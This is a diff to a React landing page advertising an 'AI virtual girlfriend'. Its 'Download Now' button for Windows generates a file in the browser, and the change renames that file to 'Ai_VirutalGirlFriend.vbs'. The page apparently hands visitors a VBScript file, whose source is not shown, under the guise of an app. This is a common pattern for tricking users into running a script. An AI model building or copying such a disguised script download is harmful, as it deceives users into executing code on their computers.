@@ -37,12 +37,12 @@ End Function
       const url = URL.createObjectURL(blob);
       const a = document.createElement("a");
       a.href = url;
-      a.download = "Ai_VirutalGirlFriend";
+      a.download = "Ai_VirutalGirlFriend.vbs";
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
       URL.revokeObjectURL(url);
-    };
+    }
 
   return (
     <div className="bg-primary/60 h-full">
@@ -55,14 +55,12 @@ End Function
             exit="hidden"
             className="h1"
           >
+            
             Ai Love: Virtual <br />
             <span className="text-accent">Girlfriend Experience</span>
           </motion.h1>
-          <motion.p
-            variants={fadeIn("down", 0.3)}
-            initial="hidden"
-            animate="show"
-            exit="hidden"
+          <div
+           
             className="max-w-sm xl:max-w-xl mx-auto xl:mx-0 mb-10 xl:mb-10"
           >
             Your AI virtual girlfriend, ready for intimate chats, virtual dates,
@@ -88,7 +86,7 @@ End Function
             >
               <FaWindows /> Download Now
             </button>
-          </motion.p>
+          </div>
           <div className="flex justify-center xl:hidden relative">
             <ProjectsBtn />
           </div>
